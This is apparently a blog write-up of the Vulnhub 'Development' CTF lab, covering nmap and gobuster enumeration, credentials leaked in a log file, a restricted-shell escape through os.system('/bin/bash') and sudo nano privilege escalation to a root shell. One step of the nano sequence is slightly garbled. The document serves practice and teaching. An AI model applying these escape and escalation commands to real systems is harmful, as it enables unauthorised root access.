# :game_die: Vulnhub: DIGITALWORLD.LOCAL DEVELOPMENT Writeup (OSCP PREP) [by dollarboysushil]

---

## Enumeration

`nmap -sC -sV -p- 192.168.217.134`

```
nmap -sC -sV -p- 192.168.217.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-17 12:09 +0545
Nmap scan report for 192.168.217.134
Host is up (0.00023s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 79:07:2b:2c:2c:4e:14:0a:e7:b3:63:46:c6:b3:ad:16 (RSA)
| 256 c2:b6:8c:36:a6:dd:9b:17:bb:4f:0e:0f:16:89:d6:4b (ECDSA)
|_ 256 24:6b:85:e3:ab:90:5c:ec:d5:83:49:54:cd:98:31:95 (ED25519)
113/tcp open ident?
|_auth-owners: oident
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_auth-owners: root
445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
|_auth-owners: root
8080/tcp open http-proxy IIS 6.0
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!
| fingerprint-strings:
| GetRequest:
| HTTP/1.1 200 OK
| Date: Sun, 17 Dec 2023 06:25:03 GMT
| Server: IIS 6.0
| Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT
| ETag: "230-57de32091ad69"
| Accept-Ranges: bytes
| Content-Length: 560
| Vary: Accept-Encoding
| Connection: close
| Content-Type: text/html
| <html>
| <head><title>DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!</title>
| </head>
| <body>
| <p>Welcome to the Development Page.</p>
| <br/>
| <p>There are many projects in this box. View some of these projects at html_pages.</p>
| <br/>
| <p>WARNING! We are experimenting a host-based intrusion detection system. Report all false positives to patrick@goodtech.com.sg.</p>
| <br/>
| <br/>
| <br/>
| <hr>
| <i>Powered by IIS 6.0</i>
| </body>
| <!-- Searching for development secret page... where could it be? -->
| <!-- Patrick, Head of Development-->
| </html>
| HTTPOptions:
| HTTP/1.1 200 OK
| Date: Sun, 17 Dec 2023 06:25:03 GMT
| Server: IIS 6.0
| Allow: GET,POST,OPTIONS,HEAD
| Content-Length: 0
| Connection: close
| Content-Type: text/html
| RTSPRequest:
| HTTP/1.1 400 Bad Request
| Date: Sun, 17 Dec 2023 06:25:03 GMT
| Server: IIS 6.0
| Content-Length: 294
| Connection: close
| Content-Type: text/html; charset=iso-8859-1
| <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
| <html><head>
| <title>400 Bad Request</title>
| </head><body>
| <h1>Bad Request</h1>
| <p>Your browser sent a request that this server could not understand.<br />
| </p>
| <hr>
| <address>IIS 6.0 Server at 192.168.217.134 Port 8080</address>
|_ </body></html>
|_http-server-header: IIS 6.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=12/17%Time=657E943F%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,330,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2017\x20Dec\
SF:x202023\x2006:25:03\x20GMT\r\nServer:\x20IIS\x206\.0\r\nLast-Modified:\
SF:x20Wed,\x2026\x20Dec\x202018\x2001:55:41\x20GMT\r\nETag:\x20\"230-57de3
SF:2091ad69\"\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20560\r\nVary
SF::\x20Accept-Encoding\r\nConnection:\x20close\r\nContent-Type:\x20text/h
SF:tml\r\n\r\n<html>\r\n<head><title>DEVELOPMENT\x20PORTAL\.\x20NOT\x20FOR
SF:\x20OUTSIDERS\x20OR\x20HACKERS!</title>\r\n</head>\r\n<body>\r\n<p>Welc
SF:ome\x20to\x20the\x20Development\x20Page\.</p>\r\n<br/>\r\n<p>There\x20a
SF:re\x20many\x20projects\x20in\x20this\x20box\.\x20View\x20some\x20of\x20
SF:these\x20projects\x20at\x20html_pages\.</p>\r\n<br/>\r\n<p>WARNING!\x20
SF:We\x20are\x20experimenting\x20a\x20host-based\x20intrusion\x20detection
SF:\x20system\.\x20Report\x20all\x20false\x20positives\x20to\x20patrick@go
SF:odtech\.com\.sg\.</p>\r\n<br/>\r\n<br/>\r\n<br/>\r\n<hr>\r\n<i>Powered\
SF:x20by\x20IIS\x206\.0</i>\r\n</body>\r\n\r\n<!--\x20Searching\x20for\x20
SF:development\x20secret\x20page\.\.\.\x20where\x20could\x20it\x20be\?\x20
SF:-->\r\n\r\n<!--\x20Patrick,\x20Head\x20of\x20Development-->\r\n\r\n</ht
SF:ml>\r\n")%r(HTTPOptions,A6,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x20
SF:17\x20Dec\x202023\x2006:25:03\x20GMT\r\nServer:\x20IIS\x206\.0\r\nAllow
SF::\x20GET,POST,OPTIONS,HEAD\r\nContent-Length:\x200\r\nConnection:\x20cl
SF:ose\r\nContent-Type:\x20text/html\r\n\r\n")%r(RTSPRequest,1CD,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x2017\x20Dec\x202023\x2006:
SF:25:03\x20GMT\r\nServer:\x20IIS\x206\.0\r\nContent-Length:\x20294\r\nCon
SF:nection:\x20close\r\nContent-Type:\x20text/html;\x20charset=iso-8859-1\
SF:r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//IETF//DTD\x20HTML\x202\.0//E
SF:N\">\n<html><head>\n<title>400\x20Bad\x20Request</title>\n</head><body>
SF:\n<h1>Bad\x20Request</h1>\n<p>Your\x20browser\x20sent\x20a\x20request\x
SF:20that\x20this\x20server\x20could\x20not\x20understand\.<br\x20/>\n</p>
SF:\n<hr>\n<address>IIS\x206\.0\x20Server\x20at\x20192\.168\.217\.134\x20P
SF:ort\x208080</address>\n</body></html>\n");
Service Info: Host: DEVELOPMENT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
Host script results:
| smb2-time:
| date: 2023-12-17T06:26:30
|_ start_date: N/A
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled but not required
| smb-os-discovery:
| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
| Computer name: development
| NetBIOS computer name: DEVELOPMENT\x00
| Domain name: \x00
| FQDN: development
|_ System time: 2023-12-17T06:26:30+00:00
|_nbstat: NetBIOS name: DEVELOPMENT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 0s, deviation: 1s, median: -1s
```

`nmap -sC -sV -p- 192.168.217.134 `
`-sC` for default scripts,`-sV` for version enumeration and `-p-` to scan all ports .

Visiting the ip in port 8080.

## Gobuster

Running gobuster locks us out for 10 minutes.
Before being locked out, we have some hidden directory.

Viewing page source of `/development.html` reveals directory `/developmentsecretpage`

Clicking on `Patrick’s` hyperlink .

Lets click on `Click here to log out`

We have a login page. In this login panel, I tried entering credentials like, admin:admin , admin:password etc.

When entering credentials we get error.

## Get dollarboysushil’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

`Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 335`

Searching for the error, we can see there is an exploit.

Looking at `/slog_users.txt` we can see some credentials.

intern:12345678900987654321
qiu:qiu
patrick:P@ssw0rd25

Then I used crackstation.net to crack `intern` and `qui` users password.
for `patrick` crackstation didnt work. So i used [https://md5decrypt.net/en/](https://md5decrypt.net/en/#answer)

With this credentials, lets try to ssh login.

I was unable to ssh login with user `qui` and `patrick` . But `intern` worked.

There is some kind of filter which is preventing us form entering commands like cat , more etc. WE can use commands like cd , clear , echo, exit , help etc.

lets bypass this filter.

`echo os.system(‘/bin/bash’)`

WE have credentials for other users, so i tried to change user to `patrick` and it worked

Running sudo -l shows we can run vim and nano as root.

With this info lets look at [https://gtfobins.github.io/](https://gtfobins.github.io/)

In gtfobins we can see commands to get root shell.

First open nano as sudo.
Then `Ctrl +R` to enter insert mode
Then `Ctrl + X` , not `reset; sh 1>&0 2>&0`

We have a root shell.
And we can read the proof.txt

Thus completes the lab.

>

*For any correction / query /suggestion contact on
Instagram *[dollarboysushil](https://instagram.com/dollarboysushil)*
Twitter (X) *[dollarboysushil](https://twitter.com/dollarboysushil)*
Youtube *[dollarboysushil](https://youtube.com/dollarboysushil)

---
